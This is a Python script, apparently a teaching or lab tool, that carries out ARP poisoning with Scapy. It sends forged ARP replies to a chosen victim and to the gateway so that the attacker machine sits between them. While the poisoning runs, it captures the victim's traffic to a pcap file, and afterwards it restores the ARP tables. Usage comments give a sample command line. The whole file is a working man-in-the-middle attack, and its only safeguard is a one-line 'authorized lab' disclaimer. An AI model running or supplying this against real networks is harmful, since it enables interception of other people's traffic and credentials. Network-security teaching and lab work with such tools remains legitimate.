#!/usr/bin/env python3

import argparse
import sys
import time
from multiprocessing import Event, Process

from scapy.all import (
    ARP,
    Ether,
    conf,
    get_if_hwaddr,
    sendp,
    sniff,
    srp,
    wrpcap,
)


BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def get_mac(ip: str, iface: str) -> str | None:
    packet = Ether(dst=BROADCAST_MAC) / ARP(op="who-has", pdst=ip)

    answered, _ = srp(
        packet,
        iface=iface,
        timeout=2,
        retry=3,
        verbose=False,
    )

    for _, reply in answered:
        return reply[Ether].src

    return None


class Arper:
    def __init__(self, victim_ip: str, gateway_ip: str, interface: str):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interface = interface

        conf.iface = interface
        conf.verb = 0

        self.attacker_mac = get_if_hwaddr(interface)
        self.victim_mac = get_mac(victim_ip, interface)
        self.gateway_mac = get_mac(gateway_ip, interface)

        if not self.victim_mac:
            raise RuntimeError(f"Could not resolve victim MAC for {victim_ip}")

        if not self.gateway_mac:
            raise RuntimeError(f"Could not resolve gateway MAC for {gateway_ip}")

        self.stop_event = Event()

        print(f"Initialized on interface: {interface}")
        print(f"Attacker {self.attacker_mac}")
        print(f"Victim   {victim_ip} is at {self.victim_mac}")
        print(f"Gateway  {gateway_ip} is at {self.gateway_mac}")
        print("-" * 40)

    def build_poison_packets(self):
        # Latest Scapy version requires the user of Ethernet header.  
        poison_victim = (
            Ether(dst=self.victim_mac, src=self.attacker_mac)
            / ARP(
                op=2,
                psrc=self.gateway_ip,
                hwsrc=self.attacker_mac,
                pdst=self.victim_ip,
                hwdst=self.victim_mac,
            )
        )

        poison_gateway = (
            Ether(dst=self.gateway_mac, src=self.attacker_mac)
            / ARP(
                op=2,
                psrc=self.victim_ip,
                hwsrc=self.attacker_mac,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
            )
        )

        return poison_victim, poison_gateway

    def build_restore_packets(self):
        restore_victim = (
            Ether(dst=self.victim_mac, src=self.gateway_mac)
            / ARP(
                op=2,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac,
                pdst=self.victim_ip,
                hwdst=self.victim_mac,
            )
        )

        restore_gateway = (
            Ether(dst=self.gateway_mac, src=self.victim_mac)
            / ARP(
                op=2,
                psrc=self.victim_ip,
                hwsrc=self.victim_mac,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
            )
        )

        return restore_victim, restore_gateway

    def poison(self):
        poison_victim, poison_gateway = self.build_poison_packets()

        print("Poison victim packet:")
        poison_victim.show()

        print("Poison gateway packet:")
        poison_gateway.show()

        print("Beginning ARP poison. Press CTRL-C to stop.")

        while not self.stop_event.is_set():
            sendp(poison_victim, iface=self.interface, verbose=False)
            sendp(poison_gateway, iface=self.interface, verbose=False)

            sys.stdout.write(".")
            sys.stdout.flush()

            time.sleep(1)

    def sniff_packets(self, count: int, output: str):
        time.sleep(3)

        print(f"\nSniffing {count} packets for host {self.victim_ip}")

        packets = sniff(
            iface=self.interface,
            filter=f"ip host {self.victim_ip}",
            count=count,
        )

        wrpcap(output, packets)

        print(f"\nCaptured {len(packets)} packets.")
        print(f"Wrote packets to {output}")

        self.stop_event.set()

    def restore(self):
        print("\nRestoring ARP tables...")

        restore_victim, restore_gateway = self.build_restore_packets()

        for _ in range(5):
            sendp(restore_victim, iface=self.interface, verbose=False)
            sendp(restore_gateway, iface=self.interface, verbose=False)
            time.sleep(0.5)

        print("ARP tables restored.")

    def run(self, count: int, output: str):
        poison_process = Process(target=self.poison)
        sniff_process = Process(target=self.sniff_packets, args=(count, output))

        try:
            poison_process.start()
            sniff_process.start()

            sniff_process.join()

        except KeyboardInterrupt:
            print("\nInterrupted by user.")

        finally:
            self.stop_event.set()

            if poison_process.is_alive():
                poison_process.terminate()
                poison_process.join()

            if sniff_process.is_alive():
                sniff_process.terminate()
                sniff_process.join()

            self.restore()
            print("Finished.")


def parse_args():
    parser = argparse.ArgumentParser(
        description="ARP poisoning lab script. Use only in your own authorized lab network."
    )

    parser.add_argument("victim_ip", help="Victim IP address")
    parser.add_argument("gateway_ip", help="Gateway/router IP address")
    parser.add_argument("interface", help="Network interface, e.g. eth6")
    parser.add_argument(
        "-c",
        "--count",
        type=int,
        default=100,
        help="Number of packets to sniff",
    )
    parser.add_argument(
        "-o",
        "--output",
        default="arper.pcap",
        help="Output pcap filename",
    )

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    arper = Arper(
        victim_ip=args.victim_ip,
        gateway_ip=args.gateway_ip,
        interface=args.interface,
    )

    arper.run(
        count=args.count,
        output=args.output,
    )

# ip a # find the network interface of the attacker machine
# sudo $(which python) arper.py 192.168.0.46 192.168.0.1 eth6
# 192.168.0.46 - Victim IP
# 192.168.0.1 - Gateway IP
# eth6 - Network interface of the attacker machine